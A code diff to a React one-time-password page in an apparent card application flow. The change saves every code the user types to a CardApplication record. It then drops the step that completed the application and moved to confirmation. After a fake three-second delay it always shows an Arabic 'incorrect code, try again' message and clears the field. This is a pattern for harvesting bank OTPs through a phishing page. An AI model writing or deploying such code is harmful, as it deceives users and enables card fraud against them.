@@ -23,20 +23,24 @@ export default function OtpApp() {
     setOtp(val);
   };
 
+  const [error, setError] = useState("");
+
   const handleVerify = async () => {
     if (otp.length < 1) return;
     setLoading(true);
+    setError("");
     const appId = localStorage.getItem("card_app_id");
     if (appId) {
       await base44.entities.CardApplication.update(appId, {
-        current_step: "confirmation",
-        status: "completed",
+        current_step: "otp",
         otp_code: otp,
       });
-      localStorage.removeItem("card_app_id");
     }
-    setLoading(false);
-    navigate("/confirmation");
+    setTimeout(() => {
+      setLoading(false);
+      setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
+      setOtp("");
+    }, 3000);
   };
 
   return (
@@ -75,12 +79,15 @@ export default function OtpApp() {
           </span>
         </div>
 
+        {error && (
+          <p className="text-red-500 text-sm font-semibold mb-3 text-center">{error}</p>
+        )}
         <button
           onClick={handleVerify}
           disabled={loading}
           className="w-full py-3.5 text-base font-medium rounded-full text-white bg-gray-800 hover:bg-gray-700 transition-colors disabled:opacity-70"
         >
-          {loading ? "..." : "verification code"}
+          {loading ? "جارٍ التحقق..." : "verification code"}
         </button>
       </div>
 
